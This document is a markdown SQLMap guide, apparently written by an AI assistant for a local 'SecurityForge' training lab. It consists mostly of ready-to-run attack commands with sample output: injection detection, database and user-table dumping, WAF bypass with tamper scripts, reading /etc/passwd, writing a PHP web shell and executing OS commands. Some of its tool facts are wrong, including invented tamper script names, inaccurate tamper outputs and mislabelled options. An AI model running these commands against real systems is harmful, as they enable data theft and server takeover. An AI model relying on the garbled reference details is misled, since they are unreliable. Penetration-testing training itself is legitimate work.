# SecurityForge - SQLMap Integration Guide (Complete)

## 📌 TABLE OF CONTENTS

1. [Installation & Setup](#installation--setup)
2. [SQLMap Basics](#sqlmap-basics)
3. [Target Specification](#target-specification)
4. [SQLi Detection Levels](#sqli-detection--risk-levels)
5. [Attacking GET Parameters](#attacking-get-parameters)
6. [Attacking POST Data](#attacking-post-data)
7. [Attacking Headers (Cookies, JWT)](#attacking-headers--cookies)
8. [Database Enumeration](#database-enumeration)
9. [Data Extraction](#data-extraction)
10. [Tamper Scripts](#tamper-scripts--waf-bypass)
11. [Advanced Exploitation](#advanced-exploitation-os-commands)
12. [Output & Reporting](#output--reporting)

---

## 🛠️ INSTALLATION & SETUP

### **Step 1: Install SQLMap**

```bash
# Linux/Mac
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git
cd sqlmap
python3 sqlmap.py --version

# Windows
# Download: https://github.com/sqlmapproject/sqlmap/releases
# Extract and run: python sqlmap.py

# macOS via Homebrew
brew install sqlmap
```

### **Step 2: Verify Installation**

```bash
sqlmap --version
# Output: sqlmap/1.7.x

# Check Python version (3.6+)
python3 --version
```

---

## 📚 SQLMAP BASICS

### **Simplest Command**

```bash
sqlmap -u "http://localhost:5000/api/search?q=test" --dbs

Explanation:
  -u                    : Target URL
  --dbs                 : Enumerate databases
```

### **Output Explanation**

```
[14:32:15] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[14:32:15] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause'
[14:32:15] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[14:32:16] [CRITICAL] GET parameter 'q' appears to be vulnerable to SQL injection attacks
[14:32:16] [INFO] there are 3 kinds of SQL injection vulnerabilities: boolean based blind, time based blind, error based

Parameter: q
Type: boolean-based blind
Title: AND boolean-based blind - WHERE or HAVING clause
Payload: q=test' AND 8506=8506 AND 'xVgM'='xVgM

[14:32:20] [INFO] fetching database names
available databases [3]:
[*] information_schema
[*] mysql
[*] securityforge
```

---

## 🎯 TARGET SPECIFICATION

### **Method 1: Direct URL**

```bash
# GET parameter  
sqlmap -u "http://localhost:5000/api/search?q=test" --dbs

# POST parameter
sqlmap -u "http://localhost:5000/api/login" --method POST --data "username=test&password=test" --dbs
```

### **Method 2: Burp Request File**

```bash
# Export request from Burp → Save to file
sqlmap -r burp_request.txt --dbs

# burp_request.txt contains:
GET /api/search?q=test HTTP/1.1
Host: localhost:5000
Authorization: Bearer token123
User-Agent: Mozilla/5.0
```

### **Method 3: Custom Headers & Authentication**

```bash
sqlmap -u "http://localhost:5000/api/users?id=1" \
  -H "Authorization: Bearer YOUR_JWT_TOKEN" \
  -H "X-API-Key: your_api_key" \
  --dbs
```

---

## 🔍 SQLI DETECTION & RISK LEVELS

### **Detection Levels (1-5)**

```bash
# Level 1 (default): GET/POST parameters
sqlmap -u "http://localhost:5000/api/search?q=test" --level 1 --dbs

# Level 2: Also tests cookies
sqlmap -u "http://localhost:5000/api/search?q=test" --level 2 --dbs

# Level 3: Also tests X-Forwarded-For, Referer
sqlmap -u "http://localhost:5000/api/search?q=test" --level 3 --dbs

# Level 4: Also tests User-Agent, Accept headers
sqlmap -u "http://localhost:5000/api/search?q=test" --level 4 --dbs

# Level 5: Tests all headers and parameters (slowest, most thorough)
sqlmap -u "http://localhost:5000/api/search?q=test" --level 5 --dbs
```

### **Risk Levels (1-3)**

```bash
# Risk 1 (default): Non-destructive tests
sqlmap -u "http://localhost:5000/api/search?q=test" --risk 1 --dbs

# Risk 2: Includes some potentially destructive (UPDATE, DELETE-like) tests
sqlmap -u "http://localhost:5000/api/search?q=test" --risk 2 --dbs

# Risk 3: May include UNION-based, potentially db-altering queries
sqlmap -u "http://localhost:5000/api/search?q=test" --risk 3 --dbs
```

### **Recommended for SecurityForge**

```bash
# Balanced approach
sqlmap -u "http://localhost:5000/api/FUZZ" \
  --level 3 \
  --risk 2 \
  --threads 5 \
  --dbs
```

---

## 🔓 ATTACKING GET PARAMETERS

### **Step 1: Simple GET SQLi**

```bash
sqlmap -u "http://localhost:5000/api/search?q=test" \
  --batch \
  --dbs

# --batch: Use default options automatically (no prompts)
# --dbs: Enumerate databases after detection
```

### **Step 2: Multiple Parameters**

```bash
# SQLMap tests all parameters
sqlmap -u "http://localhost:5000/api/search?q=test&category=laptop&sort=price" \
  --batch \
  --dbs

# Output shows which parameter is vulnerable:
# Parameter 'q' is vulnerable
```

### **Step 3: Specify Vulnerable Parameter**

```bash
# If you know which parameter is vulnerable
sqlmap -u "http://localhost:5000/api/search?q=test&category=laptop" \
  -p q \
  --batch \
  --dbs

# -p: Only test this specific parameter (faster)
```

---

## 🔓 ATTACKING POST DATA

### **JSON POST Data**

```bash
sqlmap -u "http://localhost:5000/api/login" \
  --method POST \
  --data '{"username":"test","password":"test"}' \
  --dbs \
  --batch

# Or specify parameter:
sqlmap -u "http://localhost:5000/api/login" \
  --method POST \
  --data '{"username":"test","password":"test"}' \
  -p username \
  --dbs \
  --batch
```

### **Form POST Data**

```bash
sqlmap -u "http://localhost:5000/api/search" \
  --method POST \
  --data "query=test&filter=category" \
  -p query \
  --dbs \
  --batch
```

### **XML POST Data**

```bash
sqlmap -u "http://localhost:5000/api/parse-xml" \
  --method POST \
  --data '<?xml version="1.0"?><root><data>test</data></root>' \
  -p data \
  --dbs \
  --batch
```

---

## 🔓 ATTACKING HEADERS & COOKIES

### **Cookie-Based SQLi**

```bash
sqlmap -u "http://localhost:5000/api/dashboard" \
  --cookie "session_id=test123; user_token=abc456" \
  --level 2 \
  --dbs \
  --batch

# -p: Specify which cookie to test
sqlmap -u "http://localhost:5000/api/dashboard" \
  --cookie "session_id=test123; user_token=abc456" \
  -p user_token \
  --dbs \
  --batch
```

### **Custom Header SQLi**

```bash
# X-Forwarded-For header SQLi
sqlmap -u "http://localhost:5000/api/admin/users" \
  -H "X-Forwarded-For: test" \
  --level 3 \
  --batch \
  --dbs

# Authorization (JWT) header SQLi
sqlmap -u "http://localhost:5000/api/users" \
  -H "Authorization: Bearer test123" \
  --level 4 \
  --batch \
  --dbs
```

---

## 📊 DATABASE ENUMERATION

### **List Databases**

```bash
sqlmap -u "http://localhost:5000/api/search?q=test" \
  --dbs \
  --batch

Output:
available databases [3]:
[*] information_schema
[*] mysql
[*] securityforge
```

### **List Tables in Database**

```bash
sqlmap -u "http://localhost:5000/api/search?q=test" \
  -D securityforge \
  --tables \
  --batch

Output:
Database: securityforge
[5 tables]
+-------------------+
| users             |
| orders            |
| products          |
| comments          |
| audit_logs        |
+-------------------+
```

### **List Columns in Table**

```bash
sqlmap -u "http://localhost:5000/api/search?q=test" \
  -D securityforge \
  -T users \
  --columns \
  --batch

Output:
Database: securityforge
Table: users
[8 columns]
+-------------------+
| id                |
| email             |
| password          |
| role              |
| is_admin          |
| balance           |
| created_at        |
| is_active         |
+-------------------+
```

---

## 🔓 DATA EXTRACTION

### **Extract All Data from Table**

```bash
sqlmap -u "http://localhost:5000/api/search?q=test" \
  -D securityforge \
  -T users \
  --dump \
  --batch

Output:
Database: securityforge
Table: users
[3 entries]
+----+-------------------------------+----------------------------------+----------+----------+---------+---------------------+-----------+
| id | email                         | password                         | role     | is_admin | balance | created_at          | is_active |
+----+-------------------------------+----------------------------------+----------+----------+---------+---------------------+-----------+
| 1  | admin@securityforge.com       | $2b$12$hash1...                  | admin    | 1        | 999999  | 2024-01-01 10:00:00 | 1         |
| 2  | user1@securityforge.com       | $2b$12$hash2...                 | user     | 0        | 1000    | 2024-01-10 14:30:00 | 1         |
| 3  | user2@securityforge.com       | $2b$12$hash3...                 | user     | 0        | 500     | 2024-01-15 09:15:00 | 1         |
+----+-------------------------------+----------------------------------+----------+----------+---------+---------------------+-----------+
```

### **Extract Specific Columns**

```bash
# Only email and password
sqlmap -u "http://localhost:5000/api/search?q=test" \
  -D securityforge \
  -T users \
  -C email,password \
  --dump \
  --batch

Output:
email                       password
admin@securityforge.com     $2b$12$hash1...
user1@securityforge.com     $2b$12$hash2...
```

### **Conditional Extraction (WHERE clause)**

```bash
# Only extract admin users
sqlmap -u "http://localhost:5000/api/search?q=test" \
  -D securityforge \
  -T users \
  --dump \
  --where "is_admin=1" \
  --batch

# Only active users
sqlmap -u "http://localhost:5000/api/search?q=test" \
  -D securityforge \
  -T users \
  --dump \
  --where "is_active=1" \
  --batch
```

---

## 🛡️ TAMPER SCRIPTS & WAF BYPASS

### **View Available Tamper Scripts**

```bash
sqlmap --list-tampers

Available tamper scripts:
apostrophemask, apostrophenullencode, appendnullbyte, base64encode, between, bluecoat, 
celloudah, charencode, charunicodeescape, commalessmid, commalessspaceadmin, 
commalessspacebyfromy, commentbeforeparentheses, deepmagic, doublequotes, 
dunlapaling, equaltolozada, escapequotes, escapeunitocode, ...
```

### **Using Tamper Scripts**

```bash
# Single tamper script
sqlmap -u "http://localhost:5000/api/search?q=test" \
  --tamper=space2comment \
  --dbs \
  --batch

# Space to comment (MySQL)
# ' OR '1'='1' --> ' OR/**/1=1'

# Multiple tamper scripts (chain)
sqlmap -u "http://localhost:5000/api/search?q=test" \
  --tamper=space2comment,between \
  --dbs \
  --batch

# space2comment: space → /**/
# between: > → NOT BETWEEN
# ' OR '1'='1' --> ' OR NOT BETWEEN 0 AND 1'
```

### **Common Tamper Scripts**

```bash
# Bypass simple filters:
--tamper=space2comment      # space → /**/
--tamper=space2plus         # space →  +
--tamper=between            # > → NOT BETWEEN ... AND
--tamper=charencode         # encode characters
--tamper=appendnullbyte     # add NULL byte
--tamper=base64encode       # base64 encode payload
--tamper=charunicodeescape  # unicode escape
--tamper=commentbeforeparentheses  # add comment before ()

# Real-world example (common WAF):
sqlmap -u "http://localhost:5000/api/search?q=test" \
  --tamper=space2comment,between,charencode \
  --dbs \
  --batch

# This creates: ' /*!50000OR*/ /*!50000NOT*/ /*!50000BETWEEN*/ 0 /*!50000AND*/ 1
```

---

## ⚙️ ADVANCED EXPLOITATION (OS COMMANDS)

### **Execute System Commands (if DB user has privileges)**

```bash
# Check if file read is possible
sqlmap -u "http://localhost:5000/api/search?q=test" \
  --file-read=/etc/passwd \
  --dump \
  --batch

# Output:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

### **Write File (RCE potential)**

```bash
# Write shell to web root (if writable)
sqlmap -u "http://localhost:5000/api/search?q=test" \
  --file-write=shell.php \
  --file-dest=/var/www/html/shell.php \
  --batch

# Then access: http://localhost:5000/shell.php
```

### **OS Command Execution**

```bash
# Execute system command via database
sqlmap -u "http://localhost:5000/api/search?q=test" \
  --os-cmd="id" \
  --dump \
  --batch

# Output:
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## 📊 OUTPUT & REPORTING

### **Generate Report**

```bash
# Save output to file
sqlmap -u "http://localhost:5000/api/search?q=test" \
  --dbs \
  -o \
  --batch

# Creates output directory with:
sqlmap_output/
├── 20240205_securityforge.json
├── 20240205_securityforge.html
└── 20240205_securityforge.txt
```

### **Batch Scanning Multiple Targets**

```bash
# Create targets list
cat targets.txt:
http://localhost:5000/api/search?q=test
http://localhost:5000/api/users?id=1
http://localhost:5000/api/products?filter=name

# Scan all
for target in $(cat targets.txt); do
  echo "[*] Testing: $target"
  sqlmap -u "$target" \
    --batch \
    --dbs \
    -o \
    --dump-all
done
```

---

## 📋 PRACTICAL EXAMPLES

### **Example 1: Full Database Extraction**

```bash
# Discover database
sqlmap -u "http://localhost:5000/api/search?q=test" --dbs --batch

# Dump all databases
sqlmap -u "http://localhost:5000/api/search?q=test" --dump-all --batch

# Creates CSV files for each table
securityforge_users.csv
securityforge_orders.csv
securityforge_products.csv
```

### **Example 2: WAF Bypass**

```bash
# First, detect if WAF is present
sqlmap -u "http://localhost:5000/api/search?q=test" --identify-waf --batch

# If WAF detected, try tamper scripts
sqlmap -u "http://localhost:5000/api/search?q=test" \
  --tamper=space2comment,between \
  --dbs \
  --batch

# If still blocked, try encoding
sqlmap -u "http://localhost:5000/api/search?q=test" \
  --tamper=charencode,base64encode \
  --dbs \
  --batch
```

### **Example 3: Time-Based Blind SQLi Exploitation**

```bash
# SQLMap automatically detects and exploits
sqlmap -u "http://localhost:5000/api/users?id=1" \
  --technique=T \  # Time-based only
  --timesec=5 \    # 5 second delay
  --dbs \
  --batch

# Slower but works through firewalls/IDS
```

---

## 🔗 COMMON OPTIONS REFERENCE

```bash
-u, --url               # Target URL
-r, --request          # Burp request file
-p, --testParameter    # Parameter to test
-D, --database         # Database name
-T, --table            # Table name
-C, --column           # Column name(s)
-X, --httpMethod       # HTTP method
-d, --data             # POST data
--cookie               # HTTP Cookie
-H, --headers          # Custom headers
--tamper               # Tamper script(s)
--dbs                  # Enumerate databases
--tables               # Enumerate tables
--columns              # Enumerate columns
--dump                 # Dump table
--dump-all             # Dump all tables
--batch                # Non-interactive mode
--threads              # Number of threads
--level                # Test level (1-5)
--risk                 # Risk level (1-3)
--wizard               # Interactive wizard
-v, --verbose          # Verbose output
-o                     # Save output
```

---

## 📋 TESTING CHECKLIST

- [ ] Detect SQLi in GET parameters
- [ ] Detect SQLi in POST parameters
- [ ] Test cookies for SQLi
- [ ] Test custom headers for SQLi
- [ ] Enumerate databases
- [ ] List tables in target database
- [ ] Extract user data
- [ ] Extract sensitive columns
- [ ] Attempt WAF bypass
- [ ] Test different database types
- [ ] Extract file contents (if possible)
- [ ] Attempt OS command execution

---

**You now have 5 professional tool guides. Next: Create the enhanced backend with vulnerable endpoints.**

